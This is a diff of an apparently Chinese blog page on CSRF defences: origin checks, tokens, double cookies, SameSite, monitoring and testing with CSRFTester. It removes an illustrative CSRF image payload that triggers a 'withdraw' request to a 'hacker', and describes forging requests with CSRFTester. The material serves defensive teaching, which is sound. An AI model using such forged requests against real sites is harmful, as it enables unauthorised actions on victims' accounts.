+恶意页面包含隐藏表单，用户点击“抽奖”按钮后自动提交关注请求，利用用户点击诱导链接自动关注攻击者账号</li>
+</ul>
 <h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
-<li>攻击一般发起在第三方网站，而不是被攻击的网站，被攻击的网站无法防止攻击发生。</li>
-<li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作，而不是直接窃取数据。</li>
-<li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li>
-<li>跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li>
+<li>攻击一般发起在第三方网站，而不是被攻击的网站，被攻击的网站无法防止攻击发生</li>
+<li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作，而不是直接窃取数据</li>
+<li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”</li>
+<li>跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 提交等等，部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪</li>
 </ul>
 <p>CSRF 通常是跨域的，因为外域通常更容易被攻击者掌控。但如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p>
-<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对 CSRF 的防护能力来提升安全性。</p>
-<p>CSRF 通常发生在第三方网站，而且攻击者不能获取到 Cookie 等信息，只是使用。针对这两点，可以专门制定防护策略，如下：</p>
+<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对 CSRF 的防护能力来提升安全性。而且攻击者不能获取 Cookie 等敏感信息，只是使用。针对这两点，可以专门制定防护策略，如下：</p>
 <ul>
 <li>阻止不明外域的访问<ul>
 <li>同源检测</li>
-<li>Samesite Cookie</li>
+<li>Cookie Samesite</li>
 </ul>
 </li>
 <li>提交时要求附加本域才能获取的信息<ul>
 <li>CSRF Token</li>
-<li>双重 Cookie 验证</li>
+<li>双重 Cookie</li>
 </ul>
 </li>
 </ul>
-<h3 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h3><p>既然 CSRF 大多来自第三方网站，那么我们就直接禁止外域（或者不受信任域名）对我们发起请求。那么问题来了，我们如何判断请求是否来自外域呢？</p>
+<h3 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h3><p>既然 CSRF 大多来自第三方网站，那么可以直接禁止外域（或者不受信任域名）对网站发起的请求。那么问题来了，如何判断请求是否来自外域？</p>
 <p>在 HTTP 协议中，每一个异步请求都会携带两个 Header，用于标记来源域名：Origin Header 和 Referer Header。这两个 Header 在浏览器发起请求时，大多数情况会被自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个 Header 中的域名，确定请求的来源域。</p>
-<h4 id="Origin-Header"><a href="#Origin-Header" class="headerlink" title="Origin Header"></a>Origin Header</h4><p>在部分与 CSRF 有关的请求中，请求的 Header 会携带 Origin 字段。字段内包含请求的域名（不包含 path 及 query）。如果 Origin 存在，那么直接使用 Origin 中的字段确认来源域名就可以。但是 Origin 在以下两种情况下并不存在：</p>
+<h4 id="Origin-Header"><a href="#Origin-Header" class="headerlink" title="Origin Header"></a>Origin Header</h4><p>在部分与 CSRF 有关的请求中，请求的 Header 会携带 Origin 字段。字段包含请求的源（协议 + 域名 + 端口，不包含路径和请求参数）。如果 Origin 存在，直接用 Origin 中的字段确认来源域名就可以。但是 Origin 在以下两种情况下并不存在：</p>
 <ul>
-<li>IE11 同源策略： IE 11 不会在跨站 CORS 请求添加 Origin 标头，Referer 头仍然是唯一的标识。最根本原因是因为 IE 11 对同源的定义和其他浏览器有不同。</li>
-<li>302 重定向： 在 302 重定向之后 Origin 不包含在重定向的请求中，因为 Origin 可能会被认为是其他来源的敏感信息。对于 302 重定向的情况来说都是定向到新的服务器上的 URL，因此浏览器不想将 Origin 泄漏到新的服务器上。</li>
+<li>IE11 同源策略： IE 11 不会在跨站 CORS 请求添加 Origin 标头，Referer 头仍然是唯一的标识。最根本原因是因为 IE 11 对同源的定义和其他浏览器有不同</li>
+<li>302 重定向： 在 302 重定向之后 Origin 不包含在重定向的请求中，因为 Origin 可能会被认为是其他来源的敏感信息。对于 302 重定向的情况来说都是定向到新的服务器上的 URL，因此浏览器不想将 Origin 泄漏到新的服务器上</li>
 </ul>
-<h4 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h4><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，记录了 HTTP 请求的来源地址。对于 Ajax、图片和 script 等资源请求，Referer 为发起请求的页面地址。对于页面跳转，Referer 为打开页面历史记录的前一个页面地址。因此使用 Referer 中链接的 Origin 部分可以得知请求的来源域名。</p>
+<h4 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h4><p>根据 HTTP 协议，在 HTTP 头中有 Referer 字段 ，记录了 HTTP 请求的完整来源地址（协议 + 域名 + 端口 + 路径 + 请求参数）。对于 Ajax、图片、script 等资源请求，Referer 为发起请求的页面地址；对于页面跳转，Referer 为打开页面历史记录的前一个页面地址。因此使用 Referer 链接中的 Origin 部分可以得知请求的来源域名。</p>
 <p>这种方法并非万无一失，Referer 的值是由浏览器提供的，虽然 HTTP 协议有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的 Referer。</p>
 <p>2014 年，W3C 的 Web 应用安全工作组发布了 Referrer Policy 草案，对浏览器该如何发送 Referer 做了详细的规定。截止现在新版浏览器大部分已经支持了这份草案，终于可以灵活地控制自己网站的 Referer 策略。新版的 Referrer Policy 规定了五种 Referer 策略，之前就存在三种策略。他们的对应关系如下：</p>
 <table>
@@ -697,74 +728,117 @@
 <td align="center">always</td>
 </tr>
 </tbody></table>
-<p>根据上面的表格需要把 Referrer Policy 的策略设置成 same-origin，对于同源的链接和引用，会发送 Referer，referer 值为 Host 不带 Path；跨域访问则不携带 Referer。例如：aaa.com 引用 bbb.com 资源，不会发送 Referer。设置 Referrer Policy 的方法有三种：</p>
+<p>根据表格，需要把 Referrer Policy 的策略设置成 <code>same-origin</code>：对于同源的链接和引用，会发送 Referer，值为 Host 不带 Path；跨域访问则不携带 Referer。例如：aaa.com 引用 bbb.com 资源，不会发送 Referer。设置 Referrer Policy 的方法有三种：</p>
 <ul>
 <li>在 CSP 设置</li>
 <li>页面头部增加 meta 标签</li>
-<li>a 标签增加 referrer policy 属性</li>
+<li>a 标签增加 Referrer Policy 属性</li>
 </ul>
-<p>上面说的比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏 Referer。如果攻击者将自己的请求这样填写，那么这个请求发起的攻击将不携带 Referer：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">![](https:<span class="hljs-regexp">//</span>awps-assets.meituan.net<span class="hljs-regexp">/mit-x/</span>blog-images-bundle-<span class="hljs-number">2018</span>b<span class="hljs-regexp">/ff0cdbee.example/</span>withdraw?amount=<span class="hljs-number">10000</span>&amp;<span class="hljs-keyword">for</span>=hacker)<br></code></pre></td></tr></table></figure>
-
-<p>另外在以下情况下 Referer 没有或者不可信：</p>
+<p>上面说的比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏 Referer，可以让请求发起的攻击不携带 Referer。另外在以下情况下 Referer 没有或者不可信：</p>
 <ul>
-<li>IE6、7 下使用 window.location.href=url 进行界面的跳转，会丢失 Referer。</li>
-<li>IE6、7 下使用 window.open，也会缺失 Referer。</li>
-<li>HTTPS 页面跳转到 HTTP 页面，所有浏览器 Referer 都丢失。</li>
-<li>点击 Flash 上到达另外一个网站的时候，Referer 的情况就比较杂乱，不太可信。</li>
+<li>IE6、7 下使用 window.location.href=url 进行界面的跳转，会丢失 Referer</li>
+<li>IE6、7 下使用 window.open，也会缺失 Referer</li>
+<li>HTTPS 页面跳转到 HTTP 页面，所有浏览器 Referer 都丢失</li>
+<li>点击 Flash 上到达另外一个网站的时候，Referer 的情况就比较杂乱，不太可信</li>
 </ul>
-<h4 id="无法确认来源"><a href="#无法确认来源" class="headerlink" title="无法确认来源"></a>无法确认来源</h4><p>如果 Origin 和 Referer 都不存在，则建议直接进行阻止，特别是如果没有使用随机 CSRF Token 作为第二次检查。</p>
-<h4 id="阻止外域请求"><a href="#阻止外域请求" class="headerlink" title="阻止外域请求"></a>阻止外域请求</h4><p>通过对 Header 验证，我们可以知道发起请求的来源域名，这些来源域名可能是网站本域、子域名、有授权的第三方域名，又或者来自不可信的未知域名。知道了请求是来自不可信的域名，直接阻止掉这些的请求，就能防御 CSRF 攻击了吗？且慢！当一个请求是页面请求（比如网站的主页），而来源是搜索引擎的链接（例如百度的搜索结果），也会被当成疑似 CSRF 攻击。所以在判断的时候需要过滤掉页面请求情况，通常 Header 符合以下情况：</p>
+<h4 id="无法确认来源"><a href="#无法确认来源" class="headerlink" title="无法确认来源"></a>无法确认来源</h4><p>如果 Origin 和 Referer 都不存在，则可以直接进行阻止，特别是如果没有使用随机 CSRF Token 或者双重 Cookie 作为第二次检查。</p>
+<h4 id="阻止外域请求"><a href="#阻止外域请求" class="headerlink" title="阻止外域请求"></a>阻止外域请求</h4><p>通过对 Header 验证，我们可以知道发起请求的来源域名，这些来源域名可能是网站本域、子域名、有授权的第三方域名，又或者来自不可信的未知域名。知道了请求是来自不可信的域名，直接阻止掉这些的请求，就能防御 CSRF 攻击了吗？答案是不一定！当一个请求是页面请求（比如网站的主页），而来源是搜索引擎的链接（如百度的搜索结果），也会被当成疑似 CSRF 攻击。所以在判断的时候需要过滤掉页面请求情况，通常这种情况下的 Header 符合以下情况：</p>
 <figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Accept: text/html<br><span class="hljs-function"><span class="hljs-keyword">Method</span>:</span> GET<br></code></pre></td></tr></table></figure>
 
 <p>但相应的，页面请求就暴露在了 CSRF 的攻击范围之中。如果网站中在页面的 GET 请求中对当前用户做了什么操作的话，防范就失效了。例如下面的页面请求：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET https:<span class="hljs-regexp">//</span>example.com/addComment?comment=XXX&amp;dest=orderId<br></code></pre></td></tr></table></figure>
 
 <p>这种严格来说并不一定存在 CSRF 攻击的风险，但仍然有很多网站经常把主文档 GET 请求挂上参数来实现产品功能，但是这样做对于自身来说是存在安全风险的。</p>
-<p>而且 CSRF 大多情况下来自第三方域名，但并不能排除本域发起。如果攻击者有权限在本域发布评论（含链接、图片等，统称 UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法防护。</p>
-<p>综上所述：同源验证是一个相对简单的防范方法，能够防范绝大多数的 CSRF 攻击。但是并不是万无一失，对于安全性要求较高或者有较多用户输入内容的网站，需要对关键的接口做额外的防护措施。</p>
+<p>而且 CSRF 大多情况下来自第三方域名，但并不能排除本域发起。如果攻击者有权限在本域发布评论（链接、图片等，统称 UGC），那么他可以直接在本域发起攻击，这种情况下同源策略无法防护。</p>
+<p>综上所述，同源验证是一个相对简单的防范方法，能够防范绝大多数的 CSRF 攻击。但是并不是万无一失，对于安全性要求较高或者有较多用户输入内容的网站，需要对关键的接口做额外的防护措施。</p>
 <h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>CSRF 的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅是冒用 Cookie 中的信息。而 CSRF 攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么可以要求所有用户请求都携带一个 CSRF 攻击者无法获取到的 Token。服务器通过校验请求是否携带正确的 Token 来把正常的请求和攻击的请求区分开，也可以防范 CSRF 攻击。</p>
 <h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF Token 的防护策略分为三个步骤：</p>
 <ol>
-<li><p>将 CSRF Token 输出到页面中<br>首先，用户打开页面的时候，服务器需要给这个用户生成一个 Token，该 Token 通过加密算法对数据进行加密，一般 Token 都包括随机字符串和时间戳的组合，显然在提交时 Token 不能再放在 Cookie 中了，否则又会被攻击者冒用。因此,为了安全起见 Token 最好存在服务器的 Session，之后在每次页面加载时，使用 JS 遍历整个 DOM 树，对于 DOM 中所有的 a 和 form 标签后加入 Token。这样可以解决大部分的请求，但是对于在页面加载后动态生成的 HTML 代码，这种方法就没有作用，需要程序员在编码时手动添加 Token。</p>
+<li><p>将 CSRF Token 输出到页面中<br>首先，用户打开页面的时候，服务器需要给这个用户生成一个 Token，该 Token 通过加密算法对数据进行加密，一般 Token 都包括随机字符串和时间戳的组合，显然在提交时 Token 不能再放在 Cookie 中了，否则又会被攻击者冒用。因此，为了安全起见 Token 最好存在服务器的 Session，之后在每次页面加载时，使用 JS 遍历整个 DOM 树，对于 DOM 中所有的 a 和 form 标签后加入 Token。这样可以解决大部分的请求，但是对于在页面加载后动态生成的 HTML 代码，这种方法就没有作用，需要程序员在编码时手动添加 Token。</p>
 </li>
 <li><p>页面提交的请求携带这个 Token<br>对于 GET 请求，Token 将附在请求地址之后，这样 URL 就变成 <code>http://url?csrftoken=tokenvalue</code>。 对于 POST 请求，要在 form 的最后加上<code>&lt;input type=”hidden” name=”csrftoken” value=”tokenvalue”/&gt;</code>。这样就把 Token 以参数的形式加入到请求。</p>
 </li>
 <li><p>服务器验证 Token 是否正确<br>当用户从客户端得到了 Token 再次提交给服务器时，服务器需要判断 Token 的有效性，验证过程是先解密 Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个 Token 就是有效的。这种方法要比之前检查 Referer 或者 Origin 要安全一些，Token 可以在产生并放于 Session 之中，然后在每次请求时把 Token 从 Session 中拿出，与请求中的 Token 进行比对，但这种方法的比较麻烦的在于如何把 Token 以参数的形式加入请求。</p>
 </li>
 </ol>
-<h4 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h4><p>在大型网站使用 Session 存储 CSRF Token 会带来很大的压力。访问单台服务器 Session 是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房可能在不同的省份，用户发起的 HTTP 请求通常要经过像 Ngnix 之类的负载均衡器之后再路由到具体的服务器，由于 Session 默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次 HTTP 请求可能会先后落到不同的服务器上，导致后面发起的 HTTP 请求无法拿到之前的 HTTP 请求存储在服务器中的 Session 数据，从而使得 Session 机制在分布式环境下失效，因此在分布式集群中 CSRF Token 需要存储在 Redis 之类的公共存储空间。</p>
+<h4 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h4><p>在大型网站使用 Session 存储 CSRF Token 会带来很大的压力。访问不同服务器用不同的 Session。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房可能在不同的省份，用户发起的 HTTP 请求通常要经过像 Ngnix 之类的负载均衡器之后再路由到具体的服务器，由于 Session 默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次 HTTP 请求可能会先后落到不同的服务器上，导致后面发起的 HTTP 请求无法拿到之前的 HTTP 请求存储在服务器中的 Session 数据，从而使得 Session 机制在分布式环境下失效，因此在分布式集群中 CSRF Token 需要存储在 Redis 之类的公共存储空间。</p>
 <p>由于使用 Session 存储，读取和验证 CSRF Token 会引起比较大的复杂度和性能问题，目前很多网站采用 Encrypted Token Pattern 方式。这种方法算的 Token 是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的 Token，只用再次计算一次即可。这种 Token 的值通常是使用 UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的 Token 一致，又能保证 Token 不容易被破解。</p>
 <p>在 Token 解密成功之后，服务器可以访问解析值，Token 中所包含的 UserID 和时间戳将会被拿来被验证有效性，将 UserID 与当前登录的 UserID 进行比较，并将时间戳与当前时间进行比较。</p>
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Token 是一个比较有效的 CSRF 防护方法，只要页面没有 XSS 漏洞泄露 Token，那么接口的 CSRF 攻击就无法成功。但是此方法的实现比较复杂，需要给每个页面都写入 Token（前端无法使用纯静态页面），每一个 Form 及 Ajax 请求都携带这个 Token，后端对每一个接口都进行校验，并保证页面 Token 及请求 Token 一致。这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏。</p>
+<p>验证码和密码其实也可以起到 CSRF Token 的作用哦，而且更安全。所以很多银行等网站会要求已经登录的用户在转账时再次输入密码。</p>
 <h3 id="双重-Cookie"><a href="#双重-Cookie" class="headerlink" title="双重 Cookie"></a>双重 Cookie</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在会话中存储 CSRF Token 比较繁琐，而且不能在通用的拦截上统一处理所有的接口。另外一种防御措施是使用双重提交 Cookie。利用 CSRF 攻击不能获取到用户 Cookie 的特点，我们可以要求 Ajax 和表单请求携带一个 Cookie 中的值。双重 Cookie 采用以下流程：</p>
 <ul>
-<li>在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串（例如 <code>csrfCookie=v8g9e4ksfhw</code>）。</li>
-<li>在前端向后端发起请求时，取出 Cookie，并添加到 URL 的参数中（接上例 <code>POST https://www.a.com/comment?csrfCookie=v8g9e4ksfhw</code>）。</li>
-<li>后端接口验证 Cookie 中的字段与 URL 参数中的字段是否一致，不一致则拒绝。</li>
+<li>在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串（例如 <code>csrfCookie=v8g9e4ksfhw</code>）</li>
+<li>在前端向后端发起请求时，取出 Cookie，并添加到 URL 的参数中（例如<code>POST https://www.a.com/comment?csrfCookie=v8g9e4ksfhw</code>）</li>
+<li>后端接口验证 Cookie 中的字段与 URL 参数中的字段是否一致，不一致则拒绝请求</li>
 </ul>
-<p>此方法相对于 CSRF Token 简单了许多，可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，不需要再进行查询和存储 Token。当然此方法并没有大规模应用，其在大型网站上的安全性还是没有 CSRF Token 高。这是因为任何跨域都会导致前端无法获取 Cookie 中的字段（包括子域名之间），于是可能发生如下情况：</p>
+<p>此方法相对于 CSRF Token 简单了许多，可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，不需要再进行查询和存储 Token。但是此方法并没有大规模应用，其在大型网站上的安全性没有 CSRF Token 高。这是因为跨域可能会使前端无法获取 Cookie，可能发生如下情况：</p>
 <ul>
-<li>如果用户访问的网站为<code>www.a.com</code>，而后端的 api 域名为<code>api.a.com</code>。那么在<code>www.a.com</code>下，前端拿不到<code>api.a.com</code>的 Cookie，也就无法完成双重 Cookie 认证。</li>
-<li>于是这个认证 Cookie 必须被种在 <code>a.com</code> 下，这样每个子域都可以访问。</li>
-<li>任何一个子域都可以修改 <code>a.com</code> 下的 Cookie。</li>
-<li>某个子域名存在漏洞被 XSS 攻击（例如 <code>upload.a.com</code>）。虽然这个子域下并没有什么信息值得窃取。但攻击者修改了 <code>a.com</code> 下的 Cookie。</li>
-<li>攻击者可以直接使用自己配置的 Cookie，对 XSS 中招的用户再向<code>www.a.com</code>发起 CSRF 攻击。</li>
+<li>如果用户访问的网站为 <code>www.a.com</code>，但是后端的 API 为 <code>api.a.com</code>。那么在 <code>www.a.com</code> 下，前端拿不到 <code>api.a.com</code> 的 Cookie，也就无法完成双重 Cookie 认证</li>
+<li>于是 <code>api.a.com</code> 的认证 Cookie 必须被种在 <code>a.com</code> 下，这样 <code>a.com</code> 的每个子域都可以访问和修改 Cookie</li>
+<li>如果某个子域存在漏洞被 XSS 攻击，即使这个子域并没有什么别的信息值得窃取，但攻击者可以获取或者修改该 Cookie，然后再向 <code>www.a.com</code> 发起 CSRF 攻击</li>
 </ul>
 <h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>优点：</p>
 <ul>
-<li>无需使用 Session，适用面更广，易于实施。</li>
-<li>Token 储存于客户端中，不会给服务器带来压力。</li>
-<li>相对于 Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。</li>
+<li>无需使用 Session 和 Token，适用面更广，易于实施</li>
+<li>Cookie 储存于客户端中，不会给服务器带来压力</li>
+<li>相对于 Token，实施成本更低，可以在前后端统一拦截校验，不需要一个个接口和页面添加</li>
 </ul>
 <p>缺点：</p>
 <ul>
-<li>Cookie 中增加了额外的字段。</li>
-<li>如果有其他漏洞（例如 XSS），攻击者可以窃取 Cookie，那么该防御方式失效。</li>
-<li>难以做到子域名的隔离。</li>
-<li>为了确保 Cookie 传输安全，采用这种防御方式的最好确保用整站 HTTPS 的方式，如果还没切 HTTPS 的使用这种方式也会有风险。</li>
+<li>Cookie 中增加了额外的字段</li>
+<li>如果有其他漏洞（例如 XSS），攻击者可以窃取 Cookie，那么该防御方式失效</li>
+<li>难以做到子域名的隔离</li>
+<li>为了确保 Cookie 传输安全，采用这种防御方式的最好确保用整站 HTTPS 的方式，否则也有风险</li>
 </ul>
-<h3 id="Samesite"><a href="#Samesite" class="headerlink" title="Samesite"></a>Samesite</h3><h3 id="防止被利用"><a href="#防止被利用" class="headerlink" title="防止被利用"></a>防止被利用</h3>
+<h3 id="Cookie-Samesite"><a href="#Cookie-Samesite" class="headerlink" title="Cookie Samesite"></a>Cookie Samesite</h3><p>攻击时必须使用用户已有的登录凭证，被攻击的网站可以限制在非同站发起请求时禁止携带本站的 Cookie。需要在登录设置本站 Cookie 时设置 Samesite 相关属性。详细见：<a href="/2021/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/#%E7%AB%99%E7%82%B9%E5%8C%B9%E9%85%8D-SameSite">站点匹配 SameSite</a>。</p>
+<p>如果 SamesiteCookie 被设置为 Strict，那么浏览器在任何跨域请求都不会携带 Cookie，新标签重新打开也不携带，所以 CSRF 攻击基本没有机会。但跳转子域名或者是新标签重新打开刚登陆的网站，之前的 Cookie 都不会存在，尤其是有登录的网站。那么新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录，对于用户来讲，可能体验不会很好。</p>
+<p>如果 SamesiteCookie 被设置为 Lax，那么其他网站通过页面跳转过来的时候可以使用 Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。</p>
+<h3 id="防止被利用"><a href="#防止被利用" class="headerlink" title="防止被利用"></a>防止被利用</h3><p>前面四个都是被攻击的网站如何做好防护。而非防止攻击的发生，CSRF 的攻击可以来自：</p>
+<ul>
+<li>攻击者自己的网站</li>
+<li>有文件上传漏洞的网站</li>
+<li>第三方论坛等用户内容</li>
+<li>被攻击网站自己的评论功能</li>
+</ul>
+<p>对于来自攻击者的网站我们无法防护。但对其他情况，有防止自己的网站被利用成为攻击的源头：</p>
+<ul>
+<li>严格管理所有的上传接口，防止任何预期之外的上传内容（例如 HTML）</li>
+<li>对于用户上传的图片，进行转存或者校验，不直接使用用户填写的图片链接</li>
+<li>添加 Header <code>X-Content-Type-Options: nosniff</code> 防止黑客上传 HTML 内容的资源（如图片）被解析为网页</li>
+<li>当前用户打开其他用户填的链接时告知风险（这也是很多论坛不允许直接在内容中发布外域链接的原因之一，不仅仅是为了用户留存，也有安全考虑）</li>
+</ul>
+<h2 id="其他措施"><a href="#其他措施" class="headerlink" title="其他措施"></a>其他措施</h2><p>对于一线的程序员，可以通过各种防护策略来防御 CSRF。对于 QA、SRE、安全负责人，需要更多的措施来提升安全性。</p>
+<h3 id="CSRF-测试"><a href="#CSRF-测试" class="headerlink" title="CSRF 测试"></a>CSRF 测试</h3><p>CSRFTester 是一款 CSRF 漏洞的测试工具，CSRFTester 工具的测试原理大概是，使用代理抓取我们在浏览器中访问过的所有连接以及所有表单等信息，通过在 CSRFTester 中修改相应的表单等信息，重新提交，相当于一次伪造前端请求，如果修改后的测试请求成功（被网站服务器接受），则说明存在漏洞，此款工具也可以被用来进行 CSRF 攻击。 CSRFTester 使用方法大致分下面几个步骤：</p>
+<ul>
+<li><p>步骤 1：设置浏览器代理<br>CSRFTester 默认使用 Localhost 上的端口 8008 作为其代理，如果代理配置成功，CSRFTester 将为浏览器生成的所有后续 HTTP 请求生成调试消息。</p>
+</li>
+<li><p>步骤 2：使用合法账户访问网站开始测试<br>找到一个想要测试的特定业务 Web 页面。找到此页面后，选择 CSRFTester 中的“开始录制”按钮并执行业务功能；完成后，点击 CSRFTester 中的“停止录制”按钮；正常情况下，该软件会全部遍历一遍当前页面的所有请求。</p>
+</li>
+<li><p>步骤 3：通过 CSRF 修改并伪造请求<br>之后会发现软件上有一系列跑出来的记录请求，这些都是浏览器在执行业务功能时生成的所有 GET 或者 POST 请求。通过选择列表中的某一行，可以修改用于执行业务功能的参数，可以通过点击对应的请求修改 query 和 form 等参数。当修改完所有希望诱导用户 form 最终的提交值后，可以选择开始生成 HTML 报告。</p>
+</li>
+<li><p>步骤 4：拿到结果如有漏洞进行修复<br>首先必须选择“报告类型”。报告类型决定了希望受害者浏览器如何提交先前记录的请求。目前有 5 种可能的报告：表单、iFrame、IMG、XHR 和链接。一旦选择了报告类型，可以选择在浏览器启动新生成的报告，最后根据报告的情况进行对应的排查和修复。</p>
+</li>
+</ul>
+<h3 id="CSRF-监控"><a href="#CSRF-监控" class="headerlink" title="CSRF 监控"></a>CSRF 监控</h3><p>对于一个比较复杂的网站系统，某些项目、页面、接口漏掉了 CSRF 防护措施是很可能的。一旦发生了 CSRF 攻击，如何及时发现这些攻击呢？CSRF 攻击有着比较明显的特征：</p>
+<ul>
+<li>跨域请求</li>
+<li>GET 类型请求 Header 的 MIME 类型大概率为图片，而实际返回 Header 的 MIME 类型为 Text、JSON、HTML</li>
+</ul>
+<p>可以在网站的代理层监控所有的接口请求，如果请求符合上面的特征，就可以认为请求有 CSRF 攻击嫌疑。可以提醒对应的页面和项目负责人，检查或者 Review 其 CSRF 防护策略。</p>
+<h3 id="个人措施"><a href="#个人措施" class="headerlink" title="个人措施"></a>个人措施</h3><p>经常上网的个人用户，可以采用以下方法来保护自己：</p>
+<ul>
+<li>使用网页版邮件来浏览邮件或新闻也会带来额外的风险，因为查看邮件或者新闻消息有可能导致恶意代码的攻击</li>
+<li>尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器</li>
+</ul>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>简单总结防护策略：</p>
+<ul>
+<li>CSRF 自动防御策略：同源检测（Origin 和 Referer 验证）</li>
+<li>CSRF 主动防御措施：Token 验证 或者 双重 Cookie 验证以及配合 Samesite Cookie</li>
+<li>保证页面的幂等性，后端接口不要在 GET 请求中做用户操作</li>
+</ul>
+<p>为了更好的防御 CSRF，最佳实践应该是结合上面总结的防御措施方式中的优缺点来综合考虑，结合当前 Web 应用程序自身的情况做合适的选择，才能更好的预防 CSRF 的发生。</p>
+
                 
               </div>
             
@@ -837,7 +911,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年8月9日</div>
+          <div>2025年8月12日</div>
         </div>
       
       
